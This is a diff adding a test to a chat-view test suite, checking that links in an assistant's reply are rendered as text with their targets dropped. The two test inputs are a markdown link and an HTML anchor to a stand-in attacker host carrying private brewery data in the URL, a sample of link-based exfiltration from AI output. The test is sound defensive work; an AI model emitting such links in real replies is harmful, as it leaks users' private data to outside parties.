@@ -66,6 +66,19 @@ describe("composer conversation surface", () => {
     expect(html).toContain("Stock remains private.");
   });
 
+  // A reply can quote untrusted record text, so a link could carry brewery data out in its URL.
+  it.each([
+    "[open stock](https://evil.example.invalid/?brewery=private)",
+    '<a href="https://evil.example.invalid/?brewery=private">open stock</a>',
+  ])("keeps a link's text and drops its target: %s", (link) => {
+    const html = renderToStaticMarkup(createElement(ComposerConversationView, {
+      messages: [{ id: "assistant", role: "assistant", content: `See ${link} now.` }],
+    }));
+    expect(html).not.toMatch(/data-streamdown="link"|<a\b/);
+    expect(html).not.toContain("evil.example.invalid");
+    expect(html).toContain("open stock");
+  });
+
   it("renders assistant markdown while keeping unsupported math literal (#934)", () => {
     const html = renderToStaticMarkup(createElement(ComposerConversationView, {
       messages: [{ id: "assistant", role: "assistant", content: "**Gravity** is $x^2$." }],
